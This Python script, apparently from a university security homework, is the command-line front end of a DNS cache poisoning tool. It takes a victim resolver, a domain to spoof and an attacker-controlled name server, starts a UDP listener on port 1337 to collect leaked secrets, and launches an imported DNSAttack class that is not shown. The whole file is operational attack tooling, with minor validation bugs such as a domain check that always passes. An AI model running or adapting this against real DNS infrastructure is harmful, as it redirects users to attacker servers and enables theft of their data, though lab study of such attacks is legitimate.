#! /usr/bin/env python3
    
## @package Main
#   This package is responsible to execute all the passages required for the attack related to our ETH homework.
#

import dns.resolver
from dns.resolver import NoAnswer

import socket
import sys
import signal
import argparse


from blessings import Terminal #For terminal threading

from threading import Thread

#from dns_poisoning import DNSPoisoning
from dns_attack import DNSAttack


#Globals
#-----------------------------------

## Used to stop the secret fetcher

## Flag that specifies whether the secret has been fetched or not
secret_fetch_flag = True        
## User-supplied verbosity value
custom_verbosity = 0
## Max available verbosity value
max_verbosity = 4
## Instance of the blessing terminal
term = None
attack_pool = None
secret_socket = None
## Flag that stops main activities
stop = False
## Specifies if coloured output should be used
use_colors = True

## The path of the file where secrets has to be written
log_file = "log_secret.txt"

## Logging function
#
#   @brief The fuction used for output messages
#   @param msg The message to display
#   @param verbosity    The verbosity value (Default=1)
#   Verbosity can be set in order to suppres the output
#
def log(msg, verbosity=1):
    if verbosity < custom_verbosity:
        if use_colors:
                print(msg.format(t=term))
        else:
                # Strips blessing terminal option before printing msg
                print(msg.lstrip("{.*?}"))
        


##
#       @brief Handler of the CTRL+C
#       Stop the secret fetcher routine and close all socket
#
def sigint_handler(sig, frame):
    import time

    global secret_fetch_flag
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    if secret_socket != None:
            secret_socket.close()
    time.sleep(1)
    #signal.signal(signal.SIGINT, sys.exit(0))
    log("Stopping all the attacks...")
    print("Exiting...")
    sys.exit(0)

##
#       @brief Routine that fetch the secret
#       @param server_ip        The IP address to bind
#       @param server_port      The port where to bind
#
#       Start a small UDP server which listen on the provided port for the secrets.\n
#       It also write the secrets into the log_file file.
#
def secret_fetcher(server_ip, server_port):
    global stop

    try:
        secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        secret_socket.bind((server_ip, server_port))
    except:
        log("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!")
        log("Attack may be successful but no secret will be received...")

    file_secret = None
    try:
        file_secret = open(log_file, "a+")
    except:
        log("{t.bold}{t.red}Unable to open log file{t.normal}!!!!")

    log("({t.bold}secret fetcher{t.normal}) Listening on " + str(server_ip) + ":" + str(server_port) + " for incoming message...")

    while secret_fetch_flag:
        try:
                data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
                log("\n({t.bold}secret fetcher{t.normal})Received response: \n\t" + str(data))
                stop = True
                file_secret.write("\nSecret fetched: " + str(data))
        except:
                log("Error During secret fetching, exiting")
                return
                
##
#       @brief The routine that lauches the attack
#       @param victim_server_ip         The target server IP
#       @param domain                   The domain to spoof
#
#       A function responsible for creating and initializating DNSAttack class       
#
def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, bad_domain,\
         ns_server_ip=None, number_of_tries=None, victim_mac=None, nic_interface=None,\
                  attack_type=None, mode=DNSAttack.Mode.NORMAL):

        # Create the attack instance
        attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                 attacker_ip, bad_domain=bad_domain, victim_mac=victim_mac,\
                          nic_interface=nic_interface, ns_server_ip=ns_server_ip,\
                                   sigint_handler=sigint_handler, log_function=log)

        if number_of_tries == None:
                number_of_tries=50

        # Start the attack
        attack.start(number_of_tries, mode=mode, attack_type=attack_type) 


##
#       @brief Validate parameters value (eg. IP addresses, ports)
#       @return True if everything is ok, False otherwise
#
#       Pass the provided parameters to the checking function, check_ip and check_port
#       
#
def validate_parameters(params):
        global use_colors, term, custom_verbosity


        if not check_ip(params["attacker_ip"]):
                print("Invalid Attacker IP")
                return False
        if not check_ip(params["victim_dns_ip"]):
                print("Invalid Victim DNS IP")
                return False
        if not check_domain(params["domain"]):
                print("Invalid Target Domain")
                return False        
        if not check_ip(params["bad_server_ip"]):
                print("Invalid Bad Server IP")
                return False
        if not check_port(params["bad_server_port"]):
                print("Invalid Bad Server port")
                return False
        if not check_ip(params["ns_server"]):
                print("Invalid NS Server IP")
                return False
        if not check_ip(params["secret_ip"]):
                print("Invalid secret fetcher IP")
                return False
        if not check_port(params["secret_port"]):
                print("Invalid secret fetcher port")
                return False


        if params is False:
                print("Parameter error, exiting...")
                return 

        if params['no_colors']:
                use_colors = False   
        else:
                term=Terminal()

        if params['verbosity'] is not None:
                custom_verbosity = max_verbosity - int(params['verbosity'])

        return True


##
#       @brief Parse parameters present in *args
#       @param args User-supplied parameters
#
def fetch_parameter(*args):
        parser = argparse.ArgumentParser(description='DNS Poisoning Attack Tool')
        parser.add_argument('-t', '--target-domain', dest='domain', help='The target domain to spoof', required=True, type=str)
        parser.add_argument('-a', '--attacker-ip', help='Attacker IP address', required=True, type=str)
        parser.add_argument('-v', '--victim-dns-ip', help='The victim DNS IP address', required=True, type=str)

        parser.add_argument('-bs', '--bad-server-ip', dest='bad_server_ip', help='The Bad Guy DNS server IP', required=False, type=str, default='192.168.56.1')
        parser.add_argument('-bp', '--bad-server-port', dest='bad_server_port', help='The Bad Guy DNS server port', required=False, type=int, default=55553)
        parser.add_argument('-bd', '--bad-domain', dest='bad_domain', help='The domain belonging to the attacker controlled zone', required=True, type=str)
        parser.add_argument('-ns', '--ns-server', dest='ns_server', help='The victim authoritative server', required=False, type=str)
        parser.add_argument('-i', '--interface', dest='interface', help='The Network Card interface to use', required=False, type=str)


        parser.add_argument('-at', '--attack-type', dest='attack_type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str, default='NORMAL')
        parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
       
        parser.add_argument('-vm', '--victim-mac', dest='victim_mac', help='The victim MAC address', required=False, type=str)

        parser.add_argument('-si', '--secret-ip', dest='secret_ip', help='IP to bind for the secret fetcher', required=False, type=str, default="0.0.0.0")
        parser.add_argument('-sp', '--secret-port', dest='secret_port', help='Port to bind for the secret fetcher', required=False, type=int, default=1337)

        parser.add_argument('-n', '--num-attack', dest='num_attack', help='Number of attack to perform', required=False, default=200, type=int)
        parser.add_argument('-nc', '--no-colors', dest='no_colors', help='Suppress coloured terminal output', required=False, action='store_true')
        parser.add_argument('-vb', '--verbosity', dest='verbosity', help='Verbosity level', required=False, choices=['1', '2','3','4'])


        args = parser.parse_args()

        if args.mode == "FAST" and (args.victim_mac is None and args.interface is None):
                parser.error("FAST Mode require both victim MAC address and network interface")
                

        if validate_parameters(vars(args)):
                return vars(args)
        else:
                return False

##
#       @brief Check if the passed IP address is valid
#       @param The IP address to check
#       @return True if is valid, False otherwise
#
def check_ip(ip):
        import ipaddress
        
        try:
                ipaddress.ip_address(ip)
        except:
                return False
        else:
                return True

##
#       @brief Check if a domain is valid
#       Tries to resolve the domain in order to check if it is valid or not(Unimplemented)
#       
#       @param domain   The domain to check
#
#       @bug Cannot specify which nameserver should be used, unimplemented
def check_domain(domain):
        return True
        #try:
        #        socket.gethostbyname(domain.strip())
        #except socket.gaierror:
        #        print("Unable to get address for " + str(domain))
        #        return False
        #return True

##
#       @brief Check if port is valid
#       @param port     The port to check
#       @return         True if is valid, False otherwise
#
def check_port(port):
        if port < 0 or port > 65535:
                return False
        return True

def main(*args):

        param = fetch_parameter(*args)

        log("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n")


        victim_server_ip = param['victim_dns_ip']
        attacker_ip = param['attacker_ip']
        domain = param['domain']
        
        #Bad Guy
        bad_server = (param['bad_server_ip'], param['bad_server_port'])

        bad_domain = param['bad_domain']

        secret_ip = param['secret_ip']
        secret_port = param['secret_port']

        victim_mac = param['victim_mac']
        nic_interface = param['interface']

        attack_type = param['attack_type']
        mode = param['mode']
        num_of_tries = param['num_attack']
        ns_server_ip = param['ns_server']



        #Launch the secret fetcher
        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port), daemon=True)
        secret_thread.start()

        try:

                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=num_of_tries,\
                         victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface, mode=mode)

        except DNSAttack.CriticalError:
                log("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating")
        except DNSAttack.SuccessfulAttack:
                log("\n\n{t.green}{t.bold}Attack Successully executed{t.normal}")
        finally:
                log("Exiting...")




if __name__ == '__main__':
        main(*sys.argv[1:])